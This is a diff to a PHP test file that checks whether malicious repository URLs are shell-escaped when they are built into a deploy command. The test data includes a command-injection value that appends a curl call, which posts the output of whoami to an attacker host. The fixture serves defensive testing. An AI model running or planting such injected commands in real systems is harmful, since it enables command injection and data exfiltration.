@@ -34,11 +34,13 @@ it('escapes malicious repository URLs in deploy_key type', function () {
     expect($result)->toHaveKey('commands');
     $command = $result['commands'];
 
-    // The malicious payload should be escaped and not executed
+    // The malicious payload should be escaped (wrapped in single quotes) and not executed
+    // escapeshellarg wraps the entire argument in single quotes, preventing shell interpretation
     expect($command)->toContain("'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'");
 
-    // The command should NOT contain unescaped semicolons or backticks that could execute
-    expect($command)->not->toContain('repo.git;curl');
+    // Verify the command properly escapes the argument by checking it's wrapped in quotes
+    // The semicolon and backticks are safe because they're inside single-quoted string
+    expect($command)->toMatch("/docker exec.*'git@github.com:user\\/repo\\.git;curl/");
 });
 
 it('escapes malicious repository URLs in source type with public repo', function () {
